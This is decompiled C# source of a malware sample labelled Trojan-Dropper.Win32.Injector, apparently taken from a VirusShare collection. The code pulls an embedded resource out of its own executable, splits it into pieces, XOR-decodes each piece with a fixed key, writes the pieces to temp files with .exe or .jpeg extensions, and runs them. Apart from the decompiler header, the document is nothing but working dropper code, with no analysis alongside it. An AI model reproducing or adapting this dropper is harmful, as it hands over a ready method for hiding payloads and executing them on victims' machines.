// Decompiled with JetBrains decompiler
// Type: kywccnBnRkCfLEhALCJju
// Assembly: cloudy beast new welcome, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 299D0446-AADA-49B2-9805-DBCFED0CE7C6
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Injector.cdjq-a5670c877a18a527b885e63c26b70faa1c647c7dc1eef4672c1087cae803a21f.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

[StandardModule]
internal sealed class kywccnBnRkCfLEhALCJju
{
  [STAThread]
  public static void Main()
  {
    string str1 = Encoding.Default.GetString(kywccnBnRkCfLEhALCJju.tWq7WHJMh4yF4Ou274Oq6WT895(Process.GetCurrentProcess().MainModule.FileName));
    string[] separator = new string[1]{ "TGlehzxvjPUlXFbn" };
    int index1 = 0;
    string[] strArray1 = new string[2]{ ".exe", ".jpeg" };
    try
    {
      string[] strArray2 = str1.Split(separator, StringSplitOptions.RemoveEmptyEntries);
      int index2 = 0;
      while (index2 < strArray2.Length)
      {
        byte[] bytes = kywccnBnRkCfLEhALCJju.vw4JuLnEc8qYaQXaFxFaPzOWEC(Encoding.Default.GetBytes(strArray2[index2]), Encoding.Default.GetBytes("key"));
        string str2 = Path.GetTempFileName() + strArray1[index1];
        File.WriteAllBytes(str2, bytes);
        Process.Start(str2);
        checked { ++index1; }
        checked { ++index2; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) Interaction.MsgBox((object) ex.ToString());
      ProjectData.ClearProjectError();
    }
  }

  public static byte[] vw4JuLnEc8qYaQXaFxFaPzOWEC(
    byte[] UFcJZTmhhuVj4Ov2fud8lQajdw,
    byte[] fX7Iq5X1f2FY6TerdY9P2ZNUfQ)
  {
    int length = fX7Iq5X1f2FY6TerdY9P2ZNUfQ.Length;
    int num = checked (UFcJZTmhhuVj4Ov2fud8lQajdw.Length - 1);
    int index = 0;
    while (index <= num)
    {
      UFcJZTmhhuVj4Ov2fud8lQajdw[index] = (byte) ((int) UFcJZTmhhuVj4Ov2fud8lQajdw[index] ^ (int) fX7Iq5X1f2FY6TerdY9P2ZNUfQ[index % length]);
      checked { ++index; }
    }
    return UFcJZTmhhuVj4Ov2fud8lQajdw;
  }

  public static byte[] tWq7WHJMh4yF4Ou274Oq6WT895(string myPMyNtBfj30kh3qQi7lWTMN3U)
  {
    IntPtr hModule = kywccnBnRkCfLEhALCJju.nkQjHt1k3xTXz4ggcUthoxcVzw(myPMyNtBfj30kh3qQi7lWTMN3U);
    IntPtr hResInfo = kywccnBnRkCfLEhALCJju.zo2nFKXVyMMtcQhgFPZdaw6PBm(hModule, "0", "RT_RCDATA");
    IntPtr source = kywccnBnRkCfLEhALCJju.yJ76kuBpnVJr2k3I6okC9ZKKQL(hModule, hResInfo);
    int num = kywccnBnRkCfLEhALCJju.Qhm0bf3d3YqPrg1IwFCaMe0566(hModule, hResInfo);
    byte[] destination = new byte[checked (num - 2 + 1)];
    Marshal.Copy(source, destination, 0, checked (num - 1));
    return destination;
  }

  [DllImport("kernel32.dll", EntryPoint = "FindResource", SetLastError = true)]
  private static extern IntPtr zo2nFKXVyMMtcQhgFPZdaw6PBm(
    IntPtr hModule,
    string lpName,
    string lpType);

  [DllImport("kernel32.dll", EntryPoint = "GetModuleHandleA")]
  private static extern IntPtr nkQjHt1k3xTXz4ggcUthoxcVzw(string moduleName);

  [DllImport("kernel32.dll", EntryPoint = "SizeofResource")]
  private static extern int Qhm0bf3d3YqPrg1IwFCaMe0566(IntPtr hModule, IntPtr hResInfo);

  [DllImport("kernel32.dll", EntryPoint = "LoadResource")]
  private static extern IntPtr yJ76kuBpnVJr2k3I6okC9ZKKQL(IntPtr hModule, IntPtr hResInfo);
}
